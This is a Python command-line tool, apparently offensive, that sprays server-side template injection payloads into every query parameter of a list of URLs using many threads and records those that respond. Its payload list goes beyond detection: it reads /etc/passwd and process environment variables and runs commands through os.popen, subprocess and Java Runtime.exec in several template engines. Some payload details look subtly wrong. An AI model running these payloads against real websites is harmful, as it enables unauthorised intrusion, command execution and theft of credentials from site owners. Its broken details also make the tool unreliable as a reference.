#!/usr/bin/env python3

import argparse
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore, Style, init
import concurrent.futures
import urllib3
import time
import urllib.parse

# Initialize colorama for colored output
init(autoreset=True)

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define SSTI payloads with diverse variations
ssti_payloads = [
    # Simple Arithmetic Expressions
    {"payload": "{{7*7}}", "keyword": "49"},
    {"payload": "{{756*6}}", "keyword": "4548"},
    {"payload": "{{9*9}}", "keyword": "81"},
    {"payload": "{{'a'+'b'+'huihui'}}", "keyword": "abhuihui"},
    
    # Encoded Payloads
    {"payload": "%7B%7B7*7%7D%7D", "keyword": "49"},  # URL-encoded {{7*7}}
    {"payload": "{{'{{7*7*7}}'}}", "keyword": "343"},  # Nested templates
    
    # Accessing Configuration and Objects
    {"payload": "{{ config.items() }}", "keyword": "config"},
    {"payload": "{{ request.method }}", "keyword": "GET"},
    {"payload": "{{ user }}", "keyword": "user"},
    {"payload": "{{ session }}", "keyword": "session"},
    
    # Method Chaining and Class Hierarchy
    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__() }}", "keyword": "subclasses"},
    {"payload": "{{ ''.__class__.__mro__[2].__subclasses__() }}", "keyword": "subclasses"},
    {"payload": "{{ ''.__class__.__base__ }}", "keyword": "str"},
    
    # File Access and Data Leakage
    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__()[40]('etc/passwd').read() }}", "keyword": "root:x:0:0:"},
    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__()[40]('C:\\Windows\\win.ini').read() }}", "keyword": "[fonts]"},
    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__()[40]('/proc/self/environ').read() }}", "keyword": "PATH="},
    
    # Command Execution
    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__()[396]('id').read() }}", "keyword": "uid="},
    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__()[396]('whoami').read() }}", "keyword": "root"},
    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__()[396]('uname -a').read() }}", "keyword": "Linux"},
    
    # Engine-Specific Payloads
    # Jinja2 (Python)
    {"payload": "{{7*7}}", "keyword": "49"},
    {"payload": "{{config.items()}}", "keyword": "config"},
    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__() }}", "keyword": "subclasses"},
    
    # Thymeleaf (Java)
    {"payload": "#{7*7}", "keyword": "49"},
    {"payload": "#{T(java.lang.Runtime).getRuntime().exec('id')}", "keyword": "uid="},
    
    # ERB (Ruby)
    {"payload": "<%=7*7%>", "keyword": "49"},
    {"payload": "<%= `id` %>", "keyword": "uid="},
    
    # Twig (PHP)
    {"payload": "{{7*7}}", "keyword": "49"},
    {"payload": "{{ source('php://filter/convert.base64-encode/resource=index') }}", "keyword": "PD9waHANCg=="},  # Base64-encoded "<?php"
    
    # Additional Complex Payloads with Bit Variations
    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['os'].popen('id').read() }}", "keyword": "uid="},
    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['subprocess'].check_output(['id']) }}", "keyword": "uid="},
    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['os'].system('id') }}", "keyword": ""},
    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['subprocess'].Popen(['id'], stdout=subprocess.PIPE).stdout.read() }}", "keyword": "uid="},
]

def parse_arguments():
    parser = argparse.ArgumentParser(description="Automate SSTI testing with payload variations.")
    parser.add_argument("-i", "--input", required=True, help="Input file with URLs")
    parser.add_argument("-o", "--output", required=True, help="Output file for vulnerable URLs")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads (default: 10)")
    return parser.parse_args()

def load_urls(file_path):
    try:
        with open(file_path, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}Error: Input file '{file_path}' not found.")
        exit(1)

def inject_payload(url, param, payload):
    try:
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        # Replace the parameter with the payload
        params[param] = payload
        new_query = urlencode(params, doseq=True)
        injected_url = urlunparse(parsed_url._replace(query=new_query))
        response = requests.get(injected_url, timeout=10, verify=False, allow_redirects=True)
        return response.text, injected_url
    except requests.exceptions.RequestException as e:
        print(f"{Fore.YELLOW}Error requesting {url}: {e}")
        return "", None

def inject_payload_with_time(url, param, payload):
    try:
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        # Replace the parameter with the payload
        params[param] = payload
        new_query = urlencode(params, doseq=True)
        injected_url = urlunparse(parsed_url._replace(query=new_query))
        start_time = time.time()
        response = requests.get(injected_url, timeout=15, verify=False, allow_redirects=True)
        end_time = time.time()
        elapsed_time = end_time - start_time
        return response.text, (elapsed_time > 5), injected_url  # Threshold set to 5 seconds
    except requests.exceptions.RequestException as e:
        print(f"{Fore.YELLOW}Error requesting {url}: {e}")
        return "", False, None

def analyze_response(response_text, expected_keyword):
    return expected_keyword in response_text

def decode_payload(payload):
    try:
        return urllib.parse.unquote(payload)
    except:
        return payload

def select_payloads(url):
    # Placeholder for logic to select payloads based on the URL or detected engine
    # Currently returns all payloads
    return ssti_payloads

def test_url(url):
    vulnerable = False
    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)
    if not params:
        # No parameters to test
        print(f"{Fore.YELLOW}No parameters found in URL: {url}")
        return None

    for param in params:
        for payload_entry in select_payloads(url):
            payload = payload_entry["payload"]
            keyword = payload_entry["keyword"]

            # Determine if the payload is time-based (contains 'sleep' or 'time')
            is_time_based = False
            if "sleep" in payload.lower() or "time" in payload.lower():
                is_time_based = True

            if is_time_based:
                response_text, is_delayed, injected_url = inject_payload_with_time(url, param, payload)
                if is_delayed:
                    vulnerable = True
                    print(f"{Fore.GREEN}Vulnerable (Time-Based): {url} [Param: {param}, Payload: {payload}]")
                    if injected_url:
                        print(f"{Fore.GREEN}Injected URL: {injected_url}")
                    return url  # Stop after first vulnerability detected
            else:
                # Handle encoded payloads
                decoded_payload = decode_payload(payload)
                response_text, injected_url = inject_payload(url, param, payload)
                if analyze_response(response_text, keyword):
                    vulnerable = True
                    print(f"{Fore.GREEN}Vulnerable: {url} [Param: {param}, Payload: {payload}]")
                    if injected_url:
                        print(f"{Fore.GREEN}Injected URL: {injected_url}")
                    return url  # Stop after first vulnerability detected
                else:
                    continue
    if not vulnerable:
        print(f"{Fore.RED}Not Vulnerable: {url}")
    return None

def main():
    args = parse_arguments()
    urls = load_urls(args.input)
    vulnerable_urls = []

    if not urls:
        print(f"{Fore.RED}Error: No URLs found in the input file.")
        exit(1)

    print(f"{Fore.CYAN}Starting SSTI testing with {len(urls)} URLs using {args.threads} threads...\n")

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        future_to_url = {executor.submit(test_url, url): url for url in urls}
        for future in concurrent.futures.as_completed(future_to_url):
            result = future.result()
            if result:
                vulnerable_urls.append(result)

    # Write vulnerable URLs to output file
    if vulnerable_urls:
        try:
            with open(args.output, "w") as f:
                for vuln_url in vulnerable_urls:
                    f.write(f"{vuln_url}\n")
            print(f"\n{Fore.CYAN}Vulnerable URLs have been saved to '{args.output}'")
        except Exception as e:
            print(f"{Fore.RED}Error writing to output file '{args.output}': {e}")
    else:
        print(f"\n{Fore.CYAN}No vulnerable URLs found.")

if __name__ == "__main__":
    main()
